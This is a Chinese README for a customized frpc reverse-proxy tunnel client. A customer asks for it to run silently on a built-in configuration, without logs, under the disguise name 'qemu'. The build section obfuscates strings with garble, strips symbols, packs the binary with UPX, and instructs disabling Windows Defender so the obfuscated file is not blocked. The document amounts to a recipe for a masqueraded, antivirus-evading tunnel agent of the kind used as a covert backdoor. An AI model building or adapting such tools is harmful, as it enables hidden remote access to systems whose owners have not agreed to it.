# CUSTOMER


> 隐藏全部选项，不需要配置，运行就是只使用内置配置，frpc名字改为qemu，全局更改
> 程序可以接受外部配置文件 但是同样不打印日志 ，启动两个实例




## build command

需要 Go 1.25+，编译前需禁用 Windows Defender（否则会拦截混淆文件）：

```bash
# 安装 Go 1.25
go install golang.org/dl/go1.25.5@latest
go1.25.5 download

# 混淆编译 Windows
go1.25.5 run mvdan.cc/garble@latest -literals -tiny build -trimpath -ldflags "-s -w" -o qemu.exe ./cmd/frpc
upx --best --lzma qemu.exe

# 混淆编译 Linux
GOOS=linux GOARCH=amd64 go1.25.5 run mvdan.cc/garble@latest -literals -tiny build -trimpath -ldflags "-s -w" -o qemu ./cmd/frpc
upx --best --lzma qemu
```

| 参数 | 作用 |
|------|------|
| `-trimpath` | 去除编译路径信息 |
| `-s -w` | 去除符号表和调试信息 |
| `-literals` | 混淆字符串字面量 |
| `-tiny` | 最小化输出 |
| `upx --best --lzma` | UPX 压缩，进一步减小体积 |

## run at local

```bash
go run ./cmd/frpc  -c frpc.ini 
```

## 使用方法

| 命令 | 说明 |
|------|------|
| `qemu` | 静默运行内置配置 |
| `qemu -d` | 调试模式，显示日志 |
| `qemu -c frpc.ini` | 静默运行内置配置 + 外部配置（两个实例） |
| `qemu -d -c frpc.ini` | 调试模式，两个实例都显示日志 |

## 调试方法

添加 `-d` 参数启用调试日志：

```bash
# 调试内置配置
./qemu -d

# 调试内置 + 外部配置
./qemu -d -c frpc.ini

# 本地开发调试
go run ./cmd/frpc -d
go run ./cmd/frpc -d -c frpc.ini
```